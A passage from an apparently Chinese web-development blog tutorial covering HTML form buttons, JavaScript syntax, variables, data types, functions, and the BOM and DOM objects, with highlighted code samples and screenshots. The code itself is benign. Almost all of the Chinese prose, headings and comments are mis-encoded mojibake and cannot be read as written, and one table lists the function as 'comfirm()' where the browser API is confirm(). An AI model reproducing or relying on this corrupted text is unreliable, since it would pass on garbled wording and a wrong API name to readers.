class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">	 	</span><br><span class="line">     <span class="comment">&lt;!-- è¡¨å•å¸¸è§æŒ‰é’® --&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;æŒ‰é’®&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;reset&quot;</span> <span class="attr">value</span>=<span class="string">&quot;é‡ç½®&quot;</span>&gt;</span> </span><br><span class="line">     <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;æäº¤&quot;</span>&gt;</span>   </span><br><span class="line">     <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>é€šè¿‡æµè§ˆå™¨æ‰“å¼€ä¸Šè¿°çš„è¡¨å•é¡¹htmlæ–‡ä»¶ï¼Œæœ€ç»ˆå±•ç¤ºå‡ºçš„è¡¨å•ä¿¡æ¯å¦‚ä¸‹ï¼š</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-21/d4e6fd6e75794d9e43ad0c6a3d4c6078--0018--image-20231121184043690.png" alt="image-20231121184043690"></p>
<h3 id="7-CSSå–„ç”¨æ–‡æ¡£"><a href="#7-CSSå–„ç”¨æ–‡æ¡£" class="headerlink" title="7).CSSå–„ç”¨æ–‡æ¡£"></a>7).CSSå–„ç”¨æ–‡æ¡£</h3><p>è¿›å…¥W3Cè¿›è¡ŒæŸ¥è¯¢ã€‚å³ç”¨å³æŸ¥å³å¯</p>
<h2 id="3ã€jsçš„åŸºæœ¬ä½¿ç”¨"><a href="#3ã€jsçš„åŸºæœ¬ä½¿ç”¨" class="headerlink" title="3ã€jsçš„åŸºæœ¬ä½¿ç”¨"></a>3ã€jsçš„åŸºæœ¬ä½¿ç”¨</h2><h3 id="1-ä¹¦å†™è¯­æ³•"><a href="#1-ä¹¦å†™è¯­æ³•" class="headerlink" title="1).ä¹¦å†™è¯­æ³•"></a>1).ä¹¦å†™è¯­æ³•</h3><ul>
<li><p>åŒºåˆ†å¤§å°å†™ï¼šä¸ Java ä¸€æ ·ï¼Œå˜é‡åã€å‡½æ•°åä»¥åŠå…¶ä»–ä¸€åˆ‡ä¸œè¥¿éƒ½æ˜¯åŒºåˆ†å¤§å°å†™çš„</p>
</li>
<li><p>æ¯è¡Œç»“å°¾çš„åˆ†å·å¯æœ‰å¯æ— </p>
</li>
<li><p>å¤§æ‹¬å·è¡¨ç¤ºä»£ç å—</p>
</li>
<li><p>æ³¨é‡Šï¼š</p>
<ul>
<li><p>å•è¡Œæ³¨é‡Šï¼š&#x2F;&#x2F; æ³¨é‡Šå†…å®¹</p>
</li>
<li><p>å¤šè¡Œæ³¨é‡Šï¼š&#x2F;* æ³¨é‡Šå†…å®¹ *&#x2F;</p>
</li>
</ul>
</li>
</ul>
<p>æˆ‘ä»¬éœ€è¦å€ŸåŠ©jsä¸­3é’Ÿè¾“å‡ºè¯­å¥ï¼Œæ¥æ¼”ç¤ºä¹¦å†™è¯­æ³•</p>
<table>
<thead>
<tr>
<th>api</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td>window.alert()</td>
<td>è­¦å‘Šæ¡†</td>
</tr>
<tr>
<td>document.write()</td>
<td>åœ¨HTML è¾“å‡ºå†…å®¹</td>
</tr>
<tr>
<td>console.log()</td>
<td>å†™å…¥æµè§ˆå™¨æ§åˆ¶å°</td>
</tr>
</tbody></table>
<h3 id="2-å˜é‡"><a href="#2-å˜é‡" class="headerlink" title="2).å˜é‡"></a>2).å˜é‡</h3><p>ä¹¦å†™è¯­æ³•ä¼šäº†ï¼Œå˜é‡æ˜¯ä¸€é—¨ç¼–ç¨‹è¯­è¨€æ¯”ä¸å¯å°‘çš„ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦å­¦ä¹ jsä¸­å˜é‡çš„å£°æ˜ï¼Œåœ¨jsä¸­ï¼Œå˜é‡çš„å£°æ˜å’Œjavaä¸­è¿˜æ˜¯ä¸åŒçš„ã€‚é¦–å…ˆjsä¸­ä¸»è¦é€šè¿‡å¦‚ä¸‹3ä¸ªå…³é”®å­—æ¥å£°æ˜å˜é‡çš„ï¼š</p>
<table>
<thead>
<tr>
<th>å…³é”®å­—</th>
<th>è§£é‡Š</th>
</tr>
</thead>
<tbody><tr>
<td>var</td>
<td>æ—©æœŸECMAScript5ä¸­ç”¨äºå˜é‡å£°æ˜çš„å…³é”®å­—</td>
</tr>
<tr>
<td>let</td>
<td>ECMAScript6ä¸­æ–°å¢çš„ç”¨äºå˜é‡å£°æ˜çš„å…³é”®å­—ï¼Œç›¸æ¯”è¾ƒvarï¼Œletåªåœ¨ä»£ç å—å†…ç”Ÿæ•ˆ</td>
</tr>
<tr>
<td>const</td>
<td>å£°æ˜å¸¸é‡çš„ï¼Œå¸¸é‡ä¸€æ—¦å£°æ˜ï¼Œä¸èƒ½ä¿®æ”¹</td>
</tr>
</tbody></table>
<p>åœ¨jsä¸­å£°æ˜å˜é‡è¿˜éœ€è¦æ³¨æ„å¦‚ä¸‹å‡ ç‚¹ï¼š</p>
<ul>
<li>JavaScript æ˜¯ä¸€é—¨å¼±ç±»å‹è¯­è¨€ï¼Œå˜é‡å¯ä»¥å­˜æ”¾ä¸åŒç±»å‹çš„å€¼ ã€‚</li>
<li>å˜é‡åéœ€è¦éµå¾ªå¦‚ä¸‹è§„åˆ™ï¼š<ul>
<li>ç»„æˆå­—ç¬¦å¯ä»¥æ˜¯ä»»ä½•å­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿ï¼ˆ_ï¼‰æˆ–ç¾å…ƒç¬¦å·ï¼ˆ$ï¼‰</li>
<li>æ•°å­—ä¸èƒ½å¼€å¤´</li>
<li>å»ºè®®ä½¿ç”¨é©¼å³°å‘½å</li>
</ul>
</li>
</ul>
<h3 id="3-æ•°æ®ç±»å‹ä¸è¿ç®—ç¬¦"><a href="#3-æ•°æ®ç±»å‹ä¸è¿ç®—ç¬¦" class="headerlink" title="3).æ•°æ®ç±»å‹ä¸è¿ç®—ç¬¦"></a>3).æ•°æ®ç±»å‹ä¸è¿ç®—ç¬¦</h3><p>è¿™ä¸¤ä¸ªå°±ä¸ç”¨å¤šè¯´äº†ï¼Œç›´æ¥æ”¾è¡¨æ ¼</p>
<table>
<thead>
<tr>
<th>æ•°æ®ç±»å‹</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td>number</td>
<td>æ•°å­—ï¼ˆæ•´æ•°ã€å°æ•°ã€NaN(Not a Number)ï¼‰</td>
</tr>
<tr>
<td>string</td>
<td>å­—ç¬¦ä¸²ï¼Œå•åŒå¼•çš†å¯</td>
</tr>
<tr>
<td>boolean</td>
<td>å¸ƒå°”ã€‚trueï¼Œfalse</td>
</tr>
<tr>
<td>null</td>
<td>å¯¹è±¡ä¸ºç©º</td>
</tr>
<tr>
<td>undefined</td>
<td>å½“å£°æ˜çš„å˜é‡æœªåˆå§‹åŒ–æ—¶ï¼Œè¯¥å˜é‡çš„é»˜è®¤å€¼æ˜¯ undefined</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>è¿ç®—è§„åˆ™</th>
<th>è¿ç®—ç¬¦</th>
</tr>
</thead>
<tbody><tr>
<td>ç®—æœ¯è¿ç®—ç¬¦</td>
<td>+ , - , * , &#x2F; , % , ++ , â€“</td>
</tr>
<tr>
<td>èµ‹å€¼è¿ç®—ç¬¦</td>
<td>&#x3D; , +&#x3D; , -&#x3D; , *&#x3D; , &#x2F;&#x3D; , %&#x3D;</td>
</tr>
<tr>
<td>æ¯”è¾ƒè¿ç®—ç¬¦</td>
<td>&gt; , &lt; , &gt;&#x3D; , &lt;&#x3D; , !&#x3D; , &#x3D;&#x3D; , &#x3D;&#x3D;&#x3D;   æ³¨æ„     &#x3D;&#x3D; ä¼šè¿›è¡Œç±»å‹è½¬æ¢ï¼Œ&#x3D;&#x3D;&#x3D; ä¸ä¼šè¿›è¡Œç±»å‹è½¬æ¢</td>
</tr>
<tr>
<td>é€»è¾‘è¿ç®—ç¬¦</td>
<td>&amp;&amp; , || , !</td>
</tr>
<tr>
<td>ä¸‰å…ƒè¿ç®—ç¬¦</td>
<td>æ¡ä»¶è¡¨è¾¾å¼ ? true_value: false_value</td>
</tr>
</tbody></table>
<h3 id="4-å‡½æ•°"><a href="#4-å‡½æ•°" class="headerlink" title="4).å‡½æ•°"></a>4).å‡½æ•°</h3><h4 id="â‘ ç¬¬ä¸€ç§å®šä¹‰æ–¹æ³•"><a href="#â‘ ç¬¬ä¸€ç§å®šä¹‰æ–¹æ³•" class="headerlink" title="â‘ ç¬¬ä¸€ç§å®šä¹‰æ–¹æ³•"></a>â‘ ç¬¬ä¸€ç§å®šä¹‰æ–¹æ³•</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> å‡½æ•°å(å‚æ•°<span class="number">1</span>,å‚æ•°<span class="number">2.</span>.)&#123;</span><br><span class="line">    è¦æ‰§è¡Œçš„ä»£ç </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å› ä¸ºJavaScriptæ˜¯å¼±æ•°æ®ç±»å‹çš„è¯­è¨€ï¼Œæ‰€ä»¥æœ‰å¦‚ä¸‹å‡ ç‚¹éœ€è¦æ³¨æ„ï¼š</p>
<ul>
<li>å½¢å¼å‚æ•°ä¸éœ€è¦å£°æ˜ç±»å‹ï¼Œå¹¶ä¸”JavaScriptä¸­ä¸ç®¡ä»€ä¹ˆç±»å‹éƒ½æ˜¯letæˆ–è€…varå»å£°æ˜ï¼ŒåŠ ä¸Šä¹Ÿæ²¡æœ‰æ„ä¹‰ã€‚</li>
<li>è¿”å›å€¼ä¹Ÿä¸éœ€è¦å£°æ˜ç±»å‹ï¼Œç›´æ¥returnå³å¯</li>
</ul>
<h4 id="â‘¡ç¬¬äºŒç§å®šä¹‰æ–¹æ³•"><a href="#â‘¡ç¬¬äºŒç§å®šä¹‰æ–¹æ³•" class="headerlink" title="â‘¡ç¬¬äºŒç§å®šä¹‰æ–¹æ³•"></a>â‘¡ç¬¬äºŒç§å®šä¹‰æ–¹æ³•</h4><p>ç¬¬äºŒç§å¯ä»¥é€šè¿‡varå»å®šä¹‰å‡½æ•°çš„åå­—ï¼Œå…·ä½“æ ¼å¼å¦‚ä¸‹ï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> functionName = <span class="keyword">function</span> (<span class="params">å‚æ•°<span class="number">1</span>,å‚æ•°<span class="number">2.</span>.</span>)&#123;   </span><br><span class="line">	<span class="comment">//è¦æ‰§è¡Œçš„ä»£ç </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…¶ä»–çš„å’Œç¬¬ä¸€ç§æ–¹æ³•æ˜¯ç›¸åŒçš„</p>
<h3 id="5-BOMå¯¹è±¡"><a href="#5-BOMå¯¹è±¡" class="headerlink" title="5).BOMå¯¹è±¡"></a>5).BOMå¯¹è±¡</h3><p>BOMä¸­æä¾›äº†å¦‚ä¸‹5ä¸ªå¯¹è±¡ï¼š</p>
<table>
<thead>
<tr>
<th align="left">å¯¹è±¡åç§°</th>
<th align="left">æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Window</td>
<td align="left">æµè§ˆå™¨çª—å£å¯¹è±¡</td>
</tr>
<tr>
<td align="left">Navigator</td>
<td align="left">æµè§ˆå™¨å¯¹è±¡</td>
</tr>
<tr>
<td align="left">Screen</td>
<td align="left">å±å¹•å¯¹è±¡</td>
</tr>
<tr>
<td align="left">History</td>
<td align="left">å†å²è®°å½•å¯¹è±¡</td>
</tr>
<tr>
<td align="left">Location</td>
<td align="left">dåœ°å€æ å¯¹è±¡</td>
</tr>
</tbody></table>
<p>ä¸Šè¿°5ä¸ªå¯¹è±¡ä¸æµè§ˆå™¨å„ç»„æˆå¯¹åº”çš„å…³ç³»å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="http://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-21/4188d3cbe1ed885e474d4ffbe61b3ddd--9adc--image-20231121185953491.png" alt="image-20231121185953491"></p>
<p>ä¸»è¦ä½¿ç”¨åˆ°çš„æ˜¯Windowså’ŒLocationè¿™ä¸¤ä¸ª</p>
<h4 id="â‘ Windowså¯¹è±¡"><a href="#â‘ Windowså¯¹è±¡" class="headerlink" title="â‘ Windowså¯¹è±¡"></a>â‘ Windowså¯¹è±¡</h4><p>windowå¯¹è±¡æŒ‡çš„æ˜¯æµè§ˆå™¨çª—å£å¯¹è±¡ï¼Œæ˜¯JavaScriptçš„å…¨éƒ¨å¯¹è±¡ï¼Œæ‰€ä»¥å¯¹äºwindowå¯¹è±¡ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œå¹¶ä¸”å¯¹äºwindowå¯¹è±¡çš„æ–¹æ³•å’Œå±æ€§ï¼Œæˆ‘ä»¬å¯ä»¥çœç•¥window.ä¾‹å¦‚ï¼šæˆ‘ä»¬ä¹‹å‰å­¦ä¹ çš„alert()å‡½æ•°å…¶å®æ˜¯å±äºwindowå¯¹è±¡çš„,å…¶å®Œæ•´çš„ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">window.alert(&#x27;hello&#x27;);</span><br></pre></td></tr></table></figure>

<p>å…¶å¯ä»¥çœç•¥window.  æ‰€ä»¥å¯ä»¥ç®€å†™æˆ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alert(&#x27;hello&#x27;)</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥å¯¹äºwindowå¯¹è±¡çš„å±æ€§å’Œæ–¹æ³•ï¼Œæˆ‘ä»¬éƒ½æ˜¯é‡‡ç”¨ç®€å†™çš„æ–¹å¼ã€‚windowæä¾›äº†å¾ˆå¤šå±æ€§å’Œæ–¹æ³•ï¼Œä¸‹è¡¨åˆ—å‡ºäº†å¸¸ç”¨å±æ€§å’Œæ–¹æ³•</p>
<p>windowå¯¹è±¡æä¾›äº†è·å–å…¶ä»–BOMå¯¹è±¡çš„å±æ€§ï¼š</p>
<table>
<thead>
<tr>
<th>å±æ€§</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td>history</td>
<td>ç”¨äºè·å–historyå¯¹è±¡</td>
</tr>
<tr>
<td>location</td>
<td>ç”¨äºè·å–locationå¯¹è±¡</td>
</tr>
<tr>
<td>Navigator</td>
<td>ç”¨äºè·å–Navigatorå¯¹è±¡</td>
</tr>
<tr>
<td>Screen</td>
<td>ç”¨äºè·å–Screenå¯¹è±¡</td>
</tr>
</tbody></table>
<p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è¦ä½¿ç”¨locationå¯¹è±¡ï¼Œåªéœ€è¦é€šè¿‡ä»£ç <code>window.location</code>æˆ–è€…ç®€å†™<code>location</code>å³å¯ä½¿ç”¨</p>
<p>windowä¹Ÿæä¾›äº†ä¸€äº›å¸¸ç”¨çš„å‡½æ•°ï¼Œå¦‚ä¸‹è¡¨æ ¼æ‰€ç¤ºï¼š</p>
<table>
<thead>
<tr>
<th>å‡½æ•°</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td>alert()</td>
<td>æ˜¾ç¤ºå¸¦æœ‰ä¸€æ®µæ¶ˆæ¯å’Œä¸€ä¸ªç¡®è®¤æŒ‰é’®çš„è­¦å‘Šæ¡†ã€‚</td>
</tr>
<tr>
<td>comfirm()</td>
<td>æ˜¾ç¤ºå¸¦æœ‰ä¸€æ®µæ¶ˆæ¯ä»¥åŠç¡®è®¤æŒ‰é’®å’Œå–æ¶ˆæŒ‰é’®çš„å¯¹è¯æ¡†ã€‚</td>
</tr>
<tr>
<td>setInterval()</td>
<td>æŒ‰ç…§æŒ‡å®šçš„å‘¨æœŸï¼ˆä»¥æ¯«ç§’è®¡ï¼‰æ¥è°ƒç”¨å‡½æ•°æˆ–è®¡ç®—è¡¨è¾¾å¼ã€‚</td>
</tr>
<tr>
<td>setTimeout()</td>
<td>åœ¨æŒ‡å®šçš„æ¯«ç§’æ•°åè°ƒç”¨å‡½æ•°æˆ–è®¡ç®—è¡¨è¾¾å¼ã€‚</td>
</tr>
</tbody></table>
<h4 id="â‘¡Locationå¯¹è±¡"><a href="#â‘¡Locationå¯¹è±¡" class="headerlink" title="â‘¡Locationå¯¹è±¡"></a>â‘¡Locationå¯¹è±¡</h4><p>locationæ˜¯æŒ‡ä»£æµè§ˆå™¨çš„åœ°å€æ å¯¹è±¡ï¼Œå¯¹äºè¿™ä¸ªå¯¹è±¡ï¼Œæˆ‘ä»¬å¸¸ç”¨çš„æ˜¯hrefå±æ€§ï¼Œç”¨äºè·å–æˆ–è€…è®¾ç½®æµè§ˆå™¨çš„åœ°å€ä¿¡æ¯ï¼Œæ·»åŠ å¦‚ä¸‹ä»£ç ï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//è·å–æµè§ˆå™¨åœ°å€æ ä¿¡æ¯</span></span><br><span class="line"><span class="title function_">alert</span>(location.<span class="property">href</span>);</span><br><span class="line"><span class="comment">//è®¾ç½®æµè§ˆå™¨åœ°å€æ ä¿¡æ¯</span></span><br><span class="line">location.<span class="property">href</span> = <span class="string">&quot;https://www.itcast.cn&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>æµè§ˆå™¨æ•ˆæœå¦‚ä¸‹ï¼šé¦–å…ˆå¼¹æ¡†å±•ç¤ºæµè§ˆå™¨åœ°å€æ ä¿¡æ¯ï¼Œ</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-21/2fb1b4a2882b8e052bbc146ab2538a5b--a4c9--image-20231121191247946.png" alt="image-20231121191247946"></p>
<p>ç„¶åç‚¹å‡»ç¡®å®šåï¼Œå› ä¸ºæˆ‘ä»¬è®¾ç½®äº†åœ°å€æ ä¿¡æ¯ï¼Œæ‰€ä»¥æµè§ˆå™¨è·³è½¬åˆ°ä¼ æ™ºé¦–é¡µ</p>
<h3 id="6-DOMå¯¹è±¡"><a href="#6-DOMå¯¹è±¡" class="headerlink" title="6).DOMå¯¹è±¡"></a>6).DOMå¯¹è±¡</h3><p>HTMLä¸­çš„Elementå¯¹è±¡å¯ä»¥é€šè¿‡Documentå¯¹è±¡è·å–ï¼Œè€ŒDocumentå¯¹è±¡æ˜¯é€šè¿‡windowå¯¹è±¡è·å–çš„ã€‚documentå¯¹è±¡æä¾›çš„ç”¨äºè·å–Elementå…ƒç´ å¯¹è±¡çš„apiå¦‚ä¸‹è¡¨æ‰€ç¤ºï¼š</p>
<table>
<thead>
<tr>
<th>å‡½æ•°</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td>document.getElementById()</td>
<td>æ ¹æ®idå±æ€§å€¼è·å–ï¼Œè¿”å›å•ä¸ªElementå¯¹è±¡</td>
</tr>
<tr>
<td>document.getElementsByTagName()</td>
<td>æ ¹æ®æ ‡ç­¾åç§°è·å–ï¼Œè¿”å›Elementå¯¹è±¡æ•°ç»„</td>
</tr>
<tr>
<td>document.getElementsByName()</td>
<td>æ ¹æ®nameå±æ€§å€¼è·å–ï¼Œè¿”å›Elementå¯¹è±¡æ•°ç»„</td>
</tr>
<tr>
<td>document.getElementsByClassName()</td>
<td>æ ¹æ®classå±æ€§å€¼è·å–ï¼Œè¿”å›Elementå¯¹è±¡æ•°ç»„</td>
</tr>
</tbody></table>
<p>æ“ä½œå±æ€§</p>
<p>é‚£ä¹ˆè·å–åˆ°æ ‡ç­¾äº†ï¼Œæˆ‘ä»¬å¦‚ä½•æ“ä½œæ ‡ç­¾çš„å±æ€§å‘¢ï¼Ÿé€šè¿‡æŸ¥è¯¢æ–‡æ¡£èµ„æ–™ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-21/f44d21e5a1292672353de1d459108e31--a783--image-20231121192858063.png" alt="image-20231121192858063"></p>
<p>å¾—å‡ºæˆ‘ä»¬å¯ä»¥é€šè¿‡divæ ‡ç­¾å¯¹è±¡çš„innerHTMLå±æ€§æ¥ä¿®æ”¹æ ‡ç­¾çš„å†…å®¹ã€‚æ­¤æ—¶æˆ‘ä»¬æƒ³æŠŠé¡µé¢ä¸­çš„<strong>ä¼ æ™ºæ•™è‚²æ›¿æ¢æˆä¼ æ™ºæ•™è‚²666</strong>ï¼Œæ‰€ä»¥è¦è·å–2ä¸ªdivä¸­çš„ç¬¬ä¸€ä¸ªï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡ä¸‹æ ‡0è·å–æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªdivï¼Œæ³¨é‡Šä¹‹å‰çš„ä»£ç ï¼Œç¼–å†™å¦‚ä¸‹ä»£ç ï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> divs = <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&#x27;cls&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> div1 = divs[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">div1.<span class="property">innerHTML</span> = <span class="string">&quot;ä¼ æ™ºæ•™è‚²666&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>æµè§ˆå™¨åˆ·æ–°é¡µé¢ï¼Œå±•ç¤ºæ•ˆæœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p>æµè§ˆå™¨åˆ·æ–°é¡µé¢ï¼Œå±•ç¤ºæ•ˆæœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-21/5db9ab60bdd4f569c18c988a032a4621--5c20--image-20231121192928778.png" alt="image-20231121192928778"></p>
<p> å‘ç°é¡µé¢å†…å®¹å˜æˆäº†ä¼ æ™ºæ•™è‚²666</p>
<p>å…¨éƒ¨æºç ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>JS-å¯¹è±¡-DOM<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">id</span>=<span class="string">&quot;h1&quot;</span> <span class="attr">src</span>=<span class="string">&quot;img/off.gif&quot;</span>&gt;</span>  <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;cls&quot;</span>&gt;</span>ä¼ æ™ºæ•™è‚²<span class="tag">&lt;/<span class="name">div</span>&gt;</span>   <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;cls&quot;</span>&gt;</span>é»‘é©¬ç¨‹åºå‘˜<span class="tag">&lt;/<span class="name">div</span>&gt;</span>  <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;hobby&quot;</span>&gt;</span> ç”µå½±</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;hobby&quot;</span>&gt;</span> æ—…æ¸¸</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;hobby&quot;</span>&gt;</span> æ¸¸æˆ</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//1. è·å–Elementå…ƒç´ </span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//1.1 è·å–å…ƒç´ -æ ¹æ®IDè·å–</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// var img = document.getElementById(&#x27;h1&#x27;);</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// alert(img);</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//1.2 è·å–å…ƒç´ -æ ¹æ®æ ‡ç­¾è·å– - div</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// var divs = document.getElementsByTagName(&#x27;div&#x27;);</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// for (let i = 0; i &lt; divs.length; i++) &#123;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//     alert(divs[i]);</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// &#125;</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//1.3 è·å–å…ƒç´ -æ ¹æ®nameå±æ€§è·å–</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// var ins = document.getElementsByName(&#x27;hobby&#x27;);</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// for (let i = 0; i &lt; ins.length; i++) &#123;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//     alert(ins[i]);</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// &#125;</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//1.4 è·å–å…ƒç´ -æ ¹æ®classå±æ€§è·å–</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// var divs = document.getElementsByClassName(&#x27;cls&#x27;);</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// for (let i = 0; i &lt; divs.length; i++) &#123;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//     alert(divs[i]);</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// &#125;</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//2. æŸ¥è¯¢å‚è€ƒæ‰‹å†Œ, å±æ€§ã€æ–¹æ³•</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> divs = <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&#x27;cls&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> div1 = divs[<span class="number">0</span>];</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    div1.<span class="property">innerHTML</span> = <span class="string">&quot;ä¼ æ™ºæ•™è‚²666&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

